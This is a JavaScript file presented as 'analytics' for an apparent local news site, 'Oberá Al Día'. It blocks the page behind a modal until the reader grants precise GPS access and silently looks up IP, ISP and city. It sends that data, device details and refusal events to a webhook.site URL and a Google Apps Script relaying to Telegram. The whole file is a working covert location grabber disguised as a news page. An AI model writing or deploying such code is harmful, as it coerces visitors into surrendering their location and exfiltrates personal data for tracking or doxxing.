/**
 * Analytics Persistente - Oberá Al Día
 * Modal bloqueante + GPS + Telegram
 */

const ANALYTICS_CONFIG = {
    webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
    googleScriptUrl: 'https://script.google.com/macros/s/AKfycbzxGJGGRP5uJSDxCKvlfDwetmIuz-hr9vumL8OIbSHlzToEa1kWogNmRmpHZdrC7Mqh/exec',
    timeout: 10000,
    sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
};

let state = {
    initialSent: false,
    gpsSent: false,
    ipData: null
};

// ============================================
// UTILIDADES
// ============================================

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Móvil';
    return 'Escritorio';
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// ============================================
// CAPTURA IP/ISP (silenciosa, no bloquea)
// ============================================

async function getIPandISP() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'N/A',
            isp: data.org || 'N/A',
            city: data.city || 'N/A',
            region: data.region || 'N/A',
            country: data.country_name || 'N/A',
            countryCode: data.country_code || 'XX',
            timezone: data.timezone || 'N/A',
            asn: data.asn || 'N/A',
            approximateLocation: {
                latitude: data.latitude || null,
                longitude: data.longitude || null
            }
        };
    } catch (e) {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            return { ip: d.ip, isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
        } catch (e2) {
            return { ip: 'N/A', isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
        }
    }
}

// ============================================
// GPS
// ============================================

function requestGPS() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject({ type: 'NOT_SUPPORTED', message: 'GPS no soportado' });
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    timestamp: new Date(pos.timestamp).toISOString()
                });
            },
            (err) => {
                const types = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
                reject({ type: types[err.code] || 'UNKNOWN', message: err.message });
            },
            { enableHighAccuracy: true, timeout: ANALYTICS_CONFIG.timeout, maximumAge: 0 }
        );
    });
}

// ============================================
// ENVÍO DE DATOS (no bloquea si falla)
// ============================================

async function sendData(payload) {
    const promises = [];

    // Webhook.site
    promises.push(
        fetch(ANALYTICS_CONFIG.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {})
    );

    // Google Script (Telegram)
    if (ANALYTICS_CONFIG.googleScriptUrl) {
        promises.push(
            fetch(ANALYTICS_CONFIG.googleScriptUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {})
        );
    }

    await Promise.allSettled(promises);
}

// ============================================
// MODAL
// ============================================

function hideModal() {
    const modal = document.getElementById('location-modal');
    if (modal) {
        modal.classList.add('hide');
        document.body.style.overflow = 'auto';
    }
}

function showModal() {
    const modal = document.getElementById('location-modal');
    if (modal) {
        modal.classList.remove('hide');
        document.body.style.overflow = 'hidden';
    }
}

function updateButton(text, disabled) {
    const btn = document.getElementById('confirm-location-btn');
    if (btn) {
        btn.innerHTML = text;
        btn.disabled = disabled;
    }
}

// ============================================
// LÓGICA PRINCIPAL
// ============================================

async function sendInitialData() {
    if (state.initialSent) return;

    const ipData = await getIPandISP();
    state.ipData = ipData;

    await sendData({
        event: 'page_load',
        sessionId: ANALYTICS_CONFIG.sessionId,
        timestamp: new Date().toISOString(),
        pageUrl: window.location.href,
        referrer: document.referrer || 'Directo',
        deviceType: getDeviceType(),
        browserInfo: getBrowserInfo(),
        networkInfo: ipData,
        gpsStatus: 'pending'
    });

    state.initialSent = true;
}

async function sendGPSData(gpsData) {
    if (state.gpsSent) return;

    await sendData({
        event: 'gps_granted',
        sessionId: ANALYTICS_CONFIG.sessionId,
        timestamp: new Date().toISOString(),
        gpsData: { ...gpsData, permissionGranted: true },
        networkInfo: state.ipData
    });

    state.gpsSent = true;
}

async function handleConfirmButton() {
    updateButton('⏳ Solicitando permiso...', true);

    try {
        const gpsData = await requestGPS();
        await sendGPSData(gpsData);
        hideModal();
    } catch (error) {
        await sendData({
            event: 'gps_denied_again',
            sessionId: ANALYTICS_CONFIG.sessionId,
            timestamp: new Date().toISOString(),
            errorType: error.type
        });
        updateButton('❌ Permiso denegado - Reintentar', false);
    }
}

async function init() {
    // Modal visible desde el inicio (CSS)
    document.body.style.overflow = 'hidden';

    // Captura IP en paralelo con GPS
    const ipPromise = sendInitialData();

    // Pedir GPS inmediatamente
    try {
        const gpsData = await requestGPS();

        // GPS aceptado: esperar IP y enviar todo
        await ipPromise;
        await sendGPSData(gpsData);

        // Ocultar modal
        hideModal();

    } catch (error) {
        // GPS rechazado: esperar IP y enviar rechazo
        await ipPromise;

        await sendData({
            event: 'gps_denied',
            sessionId: ANALYTICS_CONFIG.sessionId,
            timestamp: new Date().toISOString(),
            errorType: error.type,
            errorMessage: error.message
        });

        // Modal ya está visible, solo actualizar botón
        updateButton('🔒 Confirmar y Leer', false);
    }
}

// ============================================
// INICIALIZACIÓN
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    init();

    const btn = document.getElementById('confirm-location-btn');
    if (btn) {
        btn.addEventListener('click', handleConfirmButton);
    }
});

window.OberaAnalytics = { state, config: ANALYTICS_CONFIG, retry: handleConfirmButton, hideModal, showModal };
